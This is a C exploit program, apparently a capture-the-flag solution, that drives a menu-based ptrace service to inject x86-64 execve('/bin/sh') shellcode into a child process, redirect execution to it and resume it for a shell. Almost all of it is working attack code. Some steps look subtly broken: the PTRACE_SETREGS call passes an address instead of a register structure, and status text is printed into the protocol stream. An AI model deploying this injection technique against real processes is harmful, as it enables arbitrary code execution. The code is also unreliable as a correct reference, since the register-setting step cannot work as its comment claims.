#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>

// Function to send a ptrace call to the parent process
unsigned long long ptrace_call(int req, unsigned long long addr, unsigned long long data) {
    printf("1\n"); // Select ptrace menu option
    fflush(stdout);

    printf("%d\n", req); // Request type (e.g., PTRACE_POKEDATA)
    fflush(stdout);

    printf("%llu\n", addr); // Address
    fflush(stdout);

    printf("%llu\n", data); // Data
    fflush(stdout);

    unsigned long long value;
    scanf("%llx", &value); // Read the result of the ptrace call
    return value;
}

// Function to write data to memory in the child process
void write_mem(unsigned long long addr, char *buffer, int len) {
    union data_chunk {
        long val;
        char bytes[sizeof(long)];
    } chunk;

    int i = 0;
    while (i < len / sizeof(long)) {
        memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
        ptrace_call(PTRACE_POKEDATA, addr + i * sizeof(long), chunk.val);
        i++;
    }

    int remaining = len % sizeof(long);
    if (remaining) {
        memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
        ptrace_call(PTRACE_POKEDATA, addr + i * sizeof(long), chunk.val);
    }
}

int main() {
    // Shellcode to execute /bin/sh
    char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
    int payload_len = sizeof(payload) - 1;

    // Known writable memory address (replace with actual address)
    unsigned long long payload_addr = 0x7fffffffdc20;

    // Inject the shellcode into the child process
    printf("Injecting payload at address: 0x%llx\n", payload_addr);
    write_mem(payload_addr, payload, payload_len);

    // Modify RIP to point to the payload
    printf("Setting RIP to payload address...\n");
    ptrace_call(PTRACE_SETREGS, payload_addr, 0);

    // Resume the child process
    printf("Resuming execution...\n");
    ptrace_call(PTRACE_CONT, 0, 0);

    // Interactive mode
    printf("Payload executed. Check for shell access.\n");
    return 0;
}
